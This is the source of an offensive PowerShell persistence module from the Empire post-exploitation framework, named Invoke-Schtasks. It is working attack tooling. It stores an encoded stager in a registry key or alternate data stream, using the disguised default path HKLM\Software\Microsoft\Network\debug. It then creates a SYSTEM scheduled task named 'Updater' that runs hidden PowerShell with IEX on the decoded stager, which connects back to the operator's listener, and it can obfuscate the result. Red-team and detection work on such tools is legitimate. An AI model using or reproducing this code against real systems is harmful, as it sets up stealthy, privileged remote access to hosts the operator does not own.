import os
from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Schtasks',

            'Author': ['@mattifestation', '@harmj0y'],

            'Description': ('Persist a stager (or script) using schtasks running as SYSTEM. This has a moderate detection/removal rating.'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/mattifestation/PowerSploit/blob/master/Persistence/Persistence.psm1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'DailyTime' : {
                'Description'   :   'Daily time to trigger the script (HH:mm).',
                'Required'      :   False,
                'Value'         :   '09:00'
            },
            'IdleTime' : {
                'Description'   :   'User idle time (in minutes) to trigger script.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'OnLogon' : {
                'Description'   :   'Switch. Trigger script on user logon.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'TaskName' : {
                'Description'   :   'Name to use for the schtask.',
                'Required'      :   True,
                'Value'         :   'Updater'
            },
            'RegPath' : {
                'Description'   :   'Registry location to store the script code. Last element is the key name.',
                'Required'      :   False,
                'Value'         :   'HKLM:\Software\Microsoft\Network\debug'
            },
            'ADSPath' : {
                'Description'   :   'Alternate-data-stream location to store the script code.',
                'Required'      :   False,
                'Value'         :   ''
            },                       
            'ExtFile' : {
                'Description'   :   'Use an external file for the payload instead of a stager.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Cleanup' : {
                'Description'   :   'Switch. Cleanup the trigger and any script from specified location.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        listenerName = self.options['Listener']['Value']
        
        # trigger options
        dailyTime = self.options['DailyTime']['Value']
        idleTime = self.options['IdleTime']['Value']
        onLogon = self.options['OnLogon']['Value']
        taskName = self.options['TaskName']['Value']
    
        # storage options
        regPath = self.options['RegPath']['Value']
        adsPath = self.options['ADSPath']['Value']

        # management options
        extFile = self.options['ExtFile']['Value']
        cleanup = self.options['Cleanup']['Value']

        # staging options
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        statusMsg = ""
        locationString = ""

        # for cleanup, remove any script from the specified storage location
        #   and remove the specified trigger
        if cleanup.lower() == 'true':
            if adsPath != '':
                # remove the ADS storage location
                if ".txt" not in adsPath:
                    print helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt")
                    return ""

                script = "Invoke-Command -ScriptBlock {cmd /C \"echo x > "+adsPath+"\"};"
            else:
                # remove the script stored in the registry at the specified reg path
                path = "\\".join(regPath.split("\\")[0:-1])
                name = regPath.split("\\")[-1]

                script = "$RegPath = '"+regPath+"';"
                script += "$parts = $RegPath.split('\\');"
                script += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
                script += "$name = $parts[-1];"
                script += "$null=Remove-ItemProperty -Force -Path $path -Name $name;"

            script += "schtasks /Delete /F /TN "+taskName+";"
            script += "'Schtasks persistence removed.'"
            if obfuscate:
                script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
            return script

        if extFile != '':
            # read in an external file as the payload and build a 
            #   base64 encoded version as encScript
            if os.path.exists(extFile):
                f = open(extFile, 'r')
                fileData = f.read()
                f.close()

                # unicode-base64 encode the script for -enc launching
                encScript = helpers.enc_powershell(fileData)
                statusMsg += "using external file " + extFile

            else:
                print helpers.color("[!] File does not exist: " + extFile)
                return ""

        else:
            # if an external file isn't specified, use a listener
            if not self.mainMenu.listeners.is_listener_valid(listenerName):
                # not a valid listener, return nothing for the script
                print helpers.color("[!] Invalid listener: " + listenerName)
                return ""

            else:
                # generate the PowerShell one-liner with all of the proper options set
                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                
                encScript = launcher.split(" ")[-1]
                statusMsg += "using listener " + listenerName


        if adsPath != '':
            # store the script in the specified alternate data stream location
            if ".txt" not in adsPath:
                    print helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt")
                    return ""
            
            script = "Invoke-Command -ScriptBlock {cmd /C \"echo "+encScript+" > "+adsPath+"\"};"

            locationString = "$(cmd /c \''\''more < "+adsPath+"\''\''\'')"
        else:
            # otherwise store the script into the specified registry location
            path = "\\".join(regPath.split("\\")[0:-1])
            name = regPath.split("\\")[-1]

            statusMsg += " stored in " + regPath

            script = "$RegPath = '"+regPath+"';"
            script += "$parts = $RegPath.split('\\');"
            script += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
            script += "$name = $parts[-1];"
            script += "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "+encScript+";"

            # note where the script is stored
            locationString = "(gp "+path+" "+name+")."+name

        # built the command that will be triggered by the schtask
        triggerCmd = "'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String("+locationString+")))\\\"'"
        
        # sanity check to make sure we haven't exceeded the cmd.exe command length max
        if len(triggerCmd) > 259:
            print helpers.color("[!] Warning: trigger command exceeds the maximum of 259 characters.")
            return ""

        if onLogon != '':
            script += "schtasks /Create /F /RU system /SC ONLOGON /TN "+taskName+" /TR "+triggerCmd+";"
            statusMsg += " with "+taskName+" OnLogon trigger."
        elif idleTime != '':
            script += "schtasks /Create /F /RU system /SC ONIDLE /I "+idleTime+" /TN "+taskName+" /TR "+triggerCmd+";"
            statusMsg += " with "+taskName+" idle trigger on " + idleTime + "."
        else:
            # otherwise assume we're doing a daily trigger
	    
            script += "schtasks /Create /F /RU system /SC DAILY /ST "+dailyTime+" /TN "+taskName+" /TR "+triggerCmd+";"
            statusMsg += " with "+taskName+" daily trigger at " + dailyTime + "."
        script += "'Schtasks persistence established "+statusMsg+"'"
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script
